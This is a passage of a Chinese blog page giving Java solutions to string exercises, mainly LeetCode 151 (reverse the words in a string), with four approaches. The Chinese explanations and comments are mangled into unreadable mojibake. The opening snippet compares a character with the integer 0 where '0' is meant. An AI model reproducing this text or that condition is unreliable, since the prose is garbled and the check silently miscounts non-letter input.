class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) &gt;= <span class="number">0</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                len += <span class="number">5</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span>[] ret = <span class="keyword">new</span> <span class="title class_">char</span>[len];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            ret[i] = s.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s.length() - <span class="number">1</span>, j = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;0&#x27;</span> &lt;= ret[i] &amp;&amp; ret[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ret[j--] = ret[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="151-ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯"><a href="#151-ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯" class="headerlink" title="151.ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯"></a>151.ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯</h2><p>ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² s ï¼Œè¯·ä½ åè½¬å­—ç¬¦ä¸²ä¸­ å•è¯ çš„é¡ºåºã€‚<br>å•è¯ æ˜¯ç”±éç©ºæ ¼å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚s ä¸­ä½¿ç”¨è‡³å°‘ä¸€ä¸ªç©ºæ ¼å°†å­—ç¬¦ä¸²ä¸­çš„ å•è¯ åˆ†éš”å¼€ã€‚<br>è¿”å› å•è¯ é¡ºåºé¢ å€’ä¸” å•è¯ ä¹‹é—´ç”¨å•ä¸ªç©ºæ ¼è¿æ¥çš„ç»“æœå­—ç¬¦ä¸²ã€‚<br>æ³¨æ„ï¼šè¾“å…¥å­—ç¬¦ä¸² sä¸­å¯èƒ½ä¼šå­˜åœ¨å‰å¯¼ç©ºæ ¼ã€å°¾éšç©ºæ ¼æˆ–è€…å•è¯é—´çš„å¤šä¸ªç©ºæ ¼ã€‚è¿”å›çš„ç»“æœå­—ç¬¦ä¸²ä¸­ï¼Œå•è¯é—´åº”å½“ä»…ç”¨å•ä¸ªç©ºæ ¼åˆ†éš”ï¼Œä¸”ä¸åŒ…å«ä»»ä½•é¢å¤–çš„ç©ºæ ¼ã€‚</p><p>ç¤ºä¾‹ 1ï¼š<br>è¾“å…¥ï¼šs &#x3D; â€œthe sky is blueâ€<br>è¾“å‡ºï¼šâ€blue is sky theâ€</p><p>ç¤ºä¾‹ 2ï¼š<br>è¾“å…¥ï¼šs &#x3D; â€œ  hello world  â€œ<br>è¾“å‡ºï¼šâ€world helloâ€<br>è§£é‡Šï¼šåè½¬åçš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å­˜åœ¨å‰å¯¼ç©ºæ ¼å’Œå°¾éšç©ºæ ¼ã€‚</p><p>æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬å°†æ•´ä¸ªå­—ç¬¦ä¸²éƒ½åè½¬è¿‡æ¥ï¼Œé‚£ä¹ˆå•è¯çš„é¡ºåºæŒ‡å®šæ˜¯å€’åºäº†ï¼Œåªä¸è¿‡å•è¯æœ¬èº«ä¹Ÿå€’åºäº†ï¼Œé‚£ä¹ˆå†æŠŠå•è¯åè½¬ä¸€ä¸‹ï¼Œå•è¯ä¸å°±æ­£è¿‡æ¥äº†ã€‚</p><p>æ‰€ä»¥è§£é¢˜æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li><p>ç§»é™¤å¤šä½™ç©ºæ ¼</p></li><li><p>å°†æ•´ä¸ªå­—ç¬¦ä¸²åè½¬</p></li><li><p>å°†æ¯ä¸ªå•è¯åè½¬</p></li><li><p>ä¸¾ä¸ªä¾‹å­ï¼Œæºå­—ç¬¦ä¸²ä¸ºï¼šâ€the sky is blue â€œ</p></li><li><p>ç§»é™¤å¤šä½™ç©ºæ ¼ : â€œthe sky is blueâ€</p></li><li><p>å­—ç¬¦ä¸²åè½¬ï¼šâ€eulb si yks ehtâ€</p></li><li><p>å•è¯åè½¬ï¼šâ€blue is sky theâ€</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">// å»é™¤é¦–å°¾åŠä¸­é—´å¤šä½™ç©ºæ ¼</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> removeSpace(s);</span><br><span class="line">        <span class="comment">// åè½¬æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line">        reverseString(sb, <span class="number">0</span>, sb.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// åè½¬å„ä¸ªå•è¯</span></span><br><span class="line">        reverseEachWord(sb);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StringBuilder <span class="title function_">removeSpace</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(s.charAt(start) == <span class="string">&#x27; &#x27;</span>) start++;</span><br><span class="line">        <span class="keyword">while</span>(s.charAt(end) == <span class="string">&#x27; &#x27;</span>) end--;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span>(start &lt;= end)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(start);</span><br><span class="line">            <span class="keyword">if</span>(c != <span class="string">&#x27; &#x27;</span> || sb.charAt(sb.length() - <span class="number">1</span>) != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(StringBuilder sb, <span class="type">int</span> start, <span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start &lt; end)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> sb.charAt(start);</span><br><span class="line">            sb.setCharAt(start, sb.charAt(end));</span><br><span class="line">            sb.setCharAt(end, temp);</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reverseEachWord</span><span class="params">(StringBuilder sb)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sb.length();</span><br><span class="line">        <span class="keyword">while</span>(start &lt; n)&#123;</span><br><span class="line">            <span class="keyword">while</span>(end &lt; n &amp;&amp; sb.charAt(end) != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                end++;</span><br><span class="line">            &#125; </span><br><span class="line">            reverseString(sb, start, end - <span class="number">1</span>);</span><br><span class="line">            start = end + <span class="number">1</span>;</span><br><span class="line">            end = start + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è§£æ³•äºŒï¼šåˆ›å»ºæ–°å­—ç¬¦æ•°ç»„å¡«å……ã€‚æ—¶é—´å¤æ‚åº¦O(n)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] initiaArr = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] newArr = <span class="keyword">new</span> <span class="title class_">char</span>[initiaArr.length + <span class="number">1</span>]; <span class="comment">//ä¸‹é¢å¾ªç¯æ·»åŠ &quot;å•è¯ &quot;ï¼Œæœ€ç»ˆæœ«å°¾çš„ç©ºæ ¼ä¸ä¼šè¿”å›</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">newArrPos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> initiaArr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; initiaArr[i] == <span class="string">&#x27; &#x27;</span>)&#123;i--;&#125; <span class="comment">// è·³è¿‡ç©ºæ ¼</span></span><br><span class="line">            <span class="comment">// æ­¤æ—¶iä½ç½®æ˜¯è¾¹ç•Œæˆ–!=ç©ºæ ¼ï¼Œå…ˆè®°å½•å½“å‰ç´¢å¼•ï¼Œä¹‹åçš„whileç”¨æ¥ç¡®å®šå­—æ¯çš„é¦–å­—æ¯ä½ç½®</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; initiaArr[i] != <span class="string">&#x27; &#x27;</span>)&#123;i--;&#125;</span><br><span class="line">            <span class="comment">// æŒ‡å®šåŒºé—´å•è¯å–å‡ºï¼ˆç”±äºiä¸ºé¦–å­—æ¯çš„å‰ä¸€ä½ï¼Œæ‰€ä»¥è¿™é‡Œ+1,å–å‡ºçš„æ¯ç»„æœ«å°¾éƒ½å¸¦æœ‰ä¸€ä¸ªç©ºæ ¼</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>; j &lt;= right; j++)&#123;</span><br><span class="line">                newArr[newArrPos++] = initiaArr[j];</span><br><span class="line">                <span class="keyword">if</span>(j == right)&#123;</span><br><span class="line">                    newArr[newArrPos++] = <span class="string">&#x27; &#x27;</span>; <span class="comment">//ç©ºæ ¼</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è‹¥æ˜¯åŸæ˜¯å­—ç¬¦æ²¡æœ‰å•è¯ç›´æ¥è¿”å›å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯æœ‰å•è¯ï¼Œè¿”å›0-æœ«å°¾ç©ºæ ¼ç´¢å¼•å‰èŒƒå›´çš„å­—ç¬¦æ•°ç»„(è½¬æˆStringè¿”å›)</span></span><br><span class="line">        <span class="keyword">if</span>(newArrPos == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(newArr, <span class="number">0</span>, newArrPos-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è§£æ³•ä¸‰ï¼šåŒåè½¬+ç§»ä½ï¼ŒString çš„ toCharArray() æ–¹æ³•åº•å±‚ä¼š new ä¸€ä¸ªå’ŒåŸå­—ç¬¦ä¸²ç›¸åŒå¤§å°çš„ char æ•°ç»„ï¼Œç©ºé—´å¤æ‚åº¦ï¼šO(n)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ€è·¯ï¼š</span></span><br><span class="line"><span class="comment">     *â‘ åè½¬å­—ç¬¦ä¸²  &quot;the sky is blue &quot; =&gt; &quot; eulb si yks eht&quot;</span></span><br><span class="line"><span class="comment">     *â‘¡éå† &quot; eulb si yks eht&quot;ï¼Œæ¯æ¬¡å…ˆå¯¹æŸä¸ªå•è¯è¿›è¡Œåè½¬å†ç§»ä½</span></span><br><span class="line"><span class="comment">     *   è¿™é‡Œä»¥ç¬¬ä¸€ä¸ªå•è¯è¿›è¡Œä¸ºæ¼”ç¤ºï¼š&quot; eulb si yks eht&quot; ==åè½¬=&gt; &quot; blue si yks eht&quot; ==ç§»ä½=&gt; &quot;blue si yks eht&quot;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//æ­¥éª¤1ï¼šå­—ç¬¦ä¸²æ•´ä½“åè½¬ï¼ˆæ­¤æ—¶å…¶ä¸­çš„å•è¯ä¹Ÿéƒ½åè½¬äº†ï¼‰</span></span><br><span class="line">        <span class="type">char</span>[] initialArr = s.toCharArray();</span><br><span class="line">        reverse(initialArr, <span class="number">0</span>, s.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; initialArr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (initialArr[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tempCur</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; initialArr.length &amp;&amp; initialArr[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> tempCur; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == tempCur) &#123; <span class="comment">//æ­¥éª¤äºŒï¼šäºŒæ¬¡åè½¬</span></span><br><span class="line">                    reverse(initialArr, tempCur, i - <span class="number">1</span>);<span class="comment">//å¯¹æŒ‡å®šèŒƒå›´å­—ç¬¦ä¸²è¿›è¡Œåè½¬ï¼Œä¸åè½¬ä»åå¾€å‰éå†ä¸€ä¸ªä¸ªå¡«å……æœ‰é—®é¢˜</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//æ­¥éª¤ä¸‰ï¼šç§»åŠ¨æ“ä½œ</span></span><br><span class="line">                initialArr[k++] = initialArr[j];</span><br><span class="line">                <span class="keyword">if</span> (j == i - <span class="number">1</span>) &#123; <span class="comment">//éå†ç»“æŸ</span></span><br><span class="line">                    <span class="comment">//é¿å…è¶Šç•Œæƒ…å†µï¼Œä¾‹å¦‚=&gt; &quot;asdasd df f&quot;ï¼Œä¸åŠ åˆ¤æ–­æœ€åå°±ä¼šæ•°ç»„è¶Šç•Œ</span></span><br><span class="line">                    <span class="keyword">if</span> (k &lt; initialArr.length) &#123;</span><br><span class="line">                        initialArr[k++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//å‚æ•°ä¸‰ï¼šä»¥é˜²å‡ºç°å¦‚&quot;asdasd df f&quot;=&gt;&quot;f df asdasd&quot;æ­£å¥½å‡‘æ»¡ä¸éœ€è¦çœç•¥ç©ºæ ¼æƒ…å†µ</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(initialArr, <span class="number">0</span>, (k == initialArr.length) &amp;&amp; (initialArr[k - <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>) ? k : k - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] chars, <span class="type">int</span> begin, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> begin, j = end; i &lt; j; i++, j--) &#123;</span><br><span class="line">            chars[i] ^= chars[j];</span><br><span class="line">            chars[j] ^= chars[i];</span><br><span class="line">            chars[i] ^= chars[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è§£æ³•å››ï¼šæ—¶é—´å¤æ‚åº¦ O(n)</span></span><br><span class="line"><span class="comment"> * å‚è€ƒå¡å“¥ c++ ä»£ç çš„ä¸‰æ­¥éª¤ï¼šå…ˆç§»é™¤å¤šä½™ç©ºæ ¼ï¼Œå†å°†æ•´ä¸ªå­—ç¬¦ä¸²åè½¬ï¼Œæœ€åæŠŠå•è¯é€ä¸ªåè½¬</span></span><br><span class="line"><span class="comment"> * æœ‰åˆ«äºè§£æ³•ä¸€ ï¼šæ²¡æœ‰ç”¨ StringBuilder  å®ç°ï¼Œè€Œæ˜¯å¯¹ String çš„ char[] æ•°ç»„æ“ä½œæ¥å®ç°ä»¥ä¸Šä¸‰ä¸ªæ­¥éª¤</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//ç”¨ char[] æ¥å®ç° String çš„ removeExtraSpacesï¼Œreverse æ“ä½œ</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="comment">//1.å»é™¤é¦–å°¾ä»¥åŠä¸­é—´å¤šä½™ç©ºæ ¼</span></span><br><span class="line">        chars = removeExtraSpaces(chars);</span><br><span class="line">        <span class="comment">//2.æ•´ä¸ªå­—ç¬¦ä¸²åè½¬</span></span><br><span class="line">        reverse(chars, <span class="number">0</span>, chars.length - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//3.å•è¯åè½¬</span></span><br><span class="line">        reverseEachWord(chars);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.ç”¨ å¿«æ…¢æŒ‡é’ˆ å»é™¤é¦–å°¾ä»¥åŠä¸­é—´å¤šä½™ç©ºæ ¼ï¼Œå¯å‚è€ƒæ•°ç»„å…ƒç´ ç§»é™¤çš„é¢˜è§£</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span>[] removeExtraSpaces(<span class="type">char</span>[] chars) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>; fast &lt; chars.length; fast++) &#123;</span><br><span class="line">            <span class="comment">//å…ˆç”¨ fast ç§»é™¤æ‰€æœ‰ç©ºæ ¼</span></span><br><span class="line">            <span class="keyword">if</span> (chars[fast] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">//åœ¨ç”¨ slow åŠ ç©ºæ ¼ã€‚ é™¤ç¬¬ä¸€ä¸ªå•è¯å¤–ï¼Œå•è¯æœ«å°¾è¦åŠ ç©ºæ ¼</span></span><br><span class="line">                <span class="keyword">if</span> (slow != <span class="number">0</span>)</span><br><span class="line">                    chars[slow++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                <span class="comment">//fast é‡åˆ°ç©ºæ ¼æˆ–éå†åˆ°å­—ç¬¦ä¸²æœ«å°¾ï¼Œå°±è¯æ˜éå†å®Œä¸€ä¸ªå•è¯äº†</span></span><br><span class="line">                <span class="keyword">while</span> (fast &lt; chars.length &amp;&amp; chars[fast] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    chars[slow++] = chars[fast++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ç›¸å½“äº c++ é‡Œçš„ resize()</span></span><br><span class="line">        <span class="type">char</span>[] newChars = <span class="keyword">new</span> <span class="title class_">char</span>[slow];</span><br><span class="line">        System.arraycopy(chars, <span class="number">0</span>, newChars, <span class="number">0</span>, slow); </span><br><span class="line">        <span class="keyword">return</span> newChars;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åŒæŒ‡é’ˆå®ç°æŒ‡å®šèŒƒå›´å†…å­—ç¬¦ä¸²åè½¬ï¼Œå¯å‚è€ƒå­—ç¬¦ä¸²åè½¬é¢˜è§£</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] chars, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (right &gt;= chars.length) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;set a wrong right&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            chars[left] ^= chars[right];</span><br><span class="line">            chars[right] ^= chars[left];</span><br><span class="line">            chars[left] ^= chars[right];</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.å•è¯åè½¬</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseEachWord</span><span class="params">(<span class="type">char</span>[] chars)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//end &lt;= s.length() è¿™é‡Œçš„ = ï¼Œæ˜¯ä¸ºäº†è®© end æ°¸è¿œæŒ‡å‘å•è¯æœ«å°¾åä¸€ä¸ªä½ç½®ï¼Œè¿™æ · reverse çš„å®å‚æ›´å¥½è®¾ç½®</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt;= chars.length; end++) &#123;</span><br><span class="line">            <span class="comment">// end æ¯æ¬¡åˆ°å•è¯æœ«å°¾åçš„ç©ºæ ¼æˆ–ä¸²å°¾,å¼€å§‹åè½¬å•è¯</span></span><br><span class="line">            <span class="keyword">if</span> (end == chars.length || chars[end] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                reverse(chars, start, end - <span class="number">1</span>);</span><br><span class="line">                start = end + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 